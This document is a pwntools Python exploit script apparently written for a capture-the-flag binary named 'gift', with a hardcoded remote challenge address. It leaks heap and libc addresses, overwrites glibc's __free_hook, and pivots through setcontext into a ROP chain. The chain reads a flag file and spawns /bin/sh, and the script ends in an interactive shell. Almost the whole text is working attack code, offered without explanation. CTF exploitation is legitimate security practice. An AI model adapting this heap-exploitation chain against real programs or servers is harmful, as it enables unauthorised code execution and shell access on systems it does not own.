#!/usr/bin/env python
# coding:utf-8

from pwn import *

binary = "./gift"
context.terminal = ["tmux", "splitw", "-h"]
mode = args["MODE"].lower()

code = context.binary = ELF(binary)
if args["LIBC"]:
    os.environ["LD_PRELOAD"] = os.path.abspath(args["LIBC"])
libc = code.libc


def exploit():
    if mode == "remote":
        io = remote("1.117.189.158", 60001)
        GIFT_OFFSET = -81964
        STDOUT_BUF_OFFSET = 0x4CC0
        LEAK_OFFSET = 0x1EBBE0
    else:
        io = process(binary, stdout=PIPE)
        GIFT_OFFSET = 984984
        STDOUT_BUF_OFFSET = 0xBC80
        LEAK_OFFSET = 0x3EBCA0

    def crack(data, length=None) -> None:
        if isinstance(data, str):
            data = data.encode()
        assert b"\n" not in data
        io.sendline(b"1")
        if length is None:
            length = len(data)
        elif len(data) < length:
            data += b"\n"
        io.sendline(str(length).encode())
        io.send(data)

    def gift(offset=None) -> None:
        io.sendline(b"0")
        if offset is not None:
            io.sendline(str(offset).encode())

    crack(cyclic(0x110))
    gift(GIFT_OFFSET)
    for i in range(0x1000 // 8):
        gift()
    crack(cyclic(0x200))

    payload = flat(
        {
            0x20: 1,  # 0x110
            0x100: p16(STDOUT_BUF_OFFSET),  # 0x110
        },
        filler="\0",
    )
    crack(payload, length=0x280)

    crack("A", length=0x110)
    crack(cyclic(0x300))

    gift()
    io.recvn(8)
    heap_base = u64(io.recvn(8)) - 0x10
    info("heap base address: %#x", heap_base)
    io.recvn(0x308)
    leak = io.recvn(8)
    if leak == b"no gift\n":
        exit(-1)
    elif leak.startswith(b"./"):
        print(leak + io.recvall())
        exit(-1)
    libc.address = u64(leak) - LEAK_OFFSET
    info("libc address: %#x", libc.address)
    io.clean()

    buf = heap_base + STDOUT_BUF_OFFSET
    fd = 3
    # mov     rdx, [rdi+8]
    # mov     [rsp], rax
    # call    qword ptr [rdx+20h]
    magic_addr = libc.address + 0x154930
    rop_addr = buf + 0x100
    rop = ROP(libc, base=rop_addr)
    rop.open("flag-03387efa-0ad7-4aaa-aae0-e44021ad310a", 4)
    rop.read(fd, buf, 0x100)
    rop.write(1, buf, 0x100)
    rop.call(rop.syscall.address, [0x142, 0, "/bin/sh", 0], abi=pwnlib.abi.ABI.syscall())
    rop.exit()
    info("%s", rop.dump())
    payload = fit(
        {
            0x20: libc.symbols["setcontext"] + 61,
            0xA0: rop_addr,
            0xA8: rop.find_gadget(instructions=["ret"]).address,
            0x100: rop.chain(),
        },
        length=0x300,
        filler="\0",
    )
    crack(payload)

    payload = flat(
        {
            0x20: 1,  # 0x110
            0x100: libc.symbols["__free_hook"],  # 0x110
        },
        filler="\0",
    )
    crack(payload, length=0x280)

    crack(flat([magic_addr, buf]), length=0x110)

    io.interactive()


if __name__ == "__main__":
    exploit()
